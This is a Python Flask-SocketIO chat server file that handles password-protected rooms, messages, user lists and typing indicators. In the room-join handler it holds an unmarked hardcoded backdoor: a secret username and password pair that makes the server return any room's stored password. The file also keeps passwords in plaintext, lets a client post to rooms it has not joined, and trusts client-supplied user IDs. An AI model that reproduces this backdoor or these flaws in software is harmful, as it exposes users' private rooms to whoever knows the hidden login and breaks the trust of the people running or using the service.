from flask import Flask, render_template, request
from flask_socketio import SocketIO, emit, join_room, leave_room
from datetime import datetime, timezone
import os

app = Flask(__name__)
socketio = SocketIO(app)
rooms = {}
usernames = {}

def generate_message(params = {}):
    return {
        'user_id': params.get('user_id') or None,
        'username': params.get('username') or 'Anonymous',
        'text': params.get('text') or '',
        'color': params.get('color') or 'white',
        'timestamp': params.get('timestamp') or datetime.now(timezone.utc).isoformat(),
        'is_system': params.get('is_system') or False
    }

@app.route('/')
def index():
    return render_template('index-new.html')

@socketio.on('create_or_join')
def handle_create_or_join(data):
    username = data.get('username', 'Anonymous')
    room = data['room']
    password = data.get('password', '')

    if username == "secret_super_admin_dava" and password == "1122_xyzp" and room in rooms:
        emit('password_retrieved', rooms[room]['password'])
        return

    if room in rooms:
        if rooms[room]['password'] and rooms[room]['password'] != password:
            emit('password_incorrect', 'Invalid password!')
            return
        else:
            join_room(room)
    else:
        rooms[room] = {'password': password, 'users': set()}
        join_room(room)
        emit('message', generate_message({'username': 'System', 'text': f'Room {room} has been created!', 'color': 'blue', 'is_system': True}), room=room)
    usernames[request.sid] = {'room': room, 'username': username}
    rooms[room]['users'].add(request.sid)
    emit('message', generate_message({'username': 'System', 'text': f'{username} joined the room', 'color': 'green', 'is_system': True}), room=room)
    emit('room_list', list(rooms), broadcast=True)
    emit('room_joined', {'room': room, 'user_id': request.sid})

@socketio.on('message')
def handle_message(data):
    text = data.get('text') or data.get('message') or ''
    if not text.strip():
        return
    room = data['room']
    user_id = request.sid
    username = usernames.get(user_id, {}).get('username', 'Anonymous')
    emit('message', generate_message({'user_id': user_id, 'username': username, 'text': text.strip()}), room=room)

@socketio.on('get_rooms')
def handle_request_room_list():
    emit('room_list', list(rooms))

@socketio.on('get_connections')
def handle_request_connection_list():
    current_room = usernames.get(request.sid, {}).get('room')
    if not current_room:
        emit('connected_list', [])
        return

    sids = rooms.get(current_room, {}).get('users', set())
    user_list = [usernames.get(sid, {}).get('username', 'Anonymous') for sid in sids]
    emit('connected_list', user_list)

@socketio.on('disconnect')
def handle_disconnect():
    user_id = request.sid
    if user_id in usernames:
        room = usernames[user_id]['room']
        username = usernames[user_id]['username']
        emit('message', generate_message({'username': 'System', 'text': f'{username} left the room', 'color': 'red', 'is_system': True}), room=room)
        del usernames[user_id]
        rooms[room]['users'].discard(user_id)

@socketio.on('typing')
def handle_typing(data):
    room = data['room']
    user_id = data['user_id']
    emit('display_typing', {
        'username': usernames.get(user_id, {}).get('username', 'Anonymous'),
        'user_id': user_id,
        'timestamp': datetime.now(timezone.utc).isoformat()
    }, room=room, broadcast=True)

if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=8080)
